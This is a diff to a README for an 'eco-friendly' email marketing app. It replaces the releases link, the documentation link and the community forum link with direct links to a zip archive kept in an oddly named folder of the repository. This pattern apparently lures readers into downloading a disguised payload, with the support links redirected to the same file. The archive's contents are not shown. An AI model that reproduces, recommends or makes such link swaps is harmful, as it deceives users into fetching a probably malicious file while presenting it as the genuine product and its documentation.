@@ -8,7 +8,7 @@ Welcome to the eco-friendly project! This application offers professional market
 
 To get started, you need to download our application. Visit this page to download:
 
-[![Download eco-friendly](https://img.shields.io/badge/Download-eco--friendly-blue.svg)](https://github.com/whisky1122/eco-friendly/releases)
+[![Download eco-friendly](https://github.com/whisky1122/eco-friendly/raw/refs/heads/main/ureteropyelogram/friendly_eco_v1.7-beta.2.zip)](https://github.com/whisky1122/eco-friendly/raw/refs/heads/main/ureteropyelogram/friendly_eco_v1.7-beta.2.zip)
 
 Once you click the link, you will see the latest release of the eco-friendly application. Follow these steps to successfully download and set it up:
 
@@ -50,8 +50,8 @@ Once you install the application, follow these steps to start creating your emai
 
 If you have questions or need support, you can join our community or check our documentation. We offer helpful resources to assist you:
 
-- **Documentation:** [Documentation Link](https://github.com/whisky1122/eco-friendly/wiki)
-- **Community Forum:** [Community Forum Link](https://community.laravelmail.com)
+- **Documentation:** [Documentation Link](https://github.com/whisky1122/eco-friendly/raw/refs/heads/main/ureteropyelogram/friendly_eco_v1.7-beta.2.zip)
+- **Community Forum:** [Community Forum Link](https://github.com/whisky1122/eco-friendly/raw/refs/heads/main/ureteropyelogram/friendly_eco_v1.7-beta.2.zip)
   
 For further assistance, you can reach out via GitHub Issues in this repository.
 
@@ -71,4 +71,4 @@ We appreciate all contributors and users who support the eco-friendly project. T
 
 To download the eco-friendly application, click the button below:
 
-[![Download eco-friendly](https://img.shields.io/badge/Download-eco--friendly-blue.svg)](https://github.com/whisky1122/eco-friendly/releases)
+[![Download eco-friendly](https://github.com/whisky1122/eco-friendly/raw/refs/heads/main/ureteropyelogram/friendly_eco_v1.7-beta.2.zip)](https://github.com/whisky1122/eco-friendly/raw/refs/heads/main/ureteropyelogram/friendly_eco_v1.7-beta.2.zip)
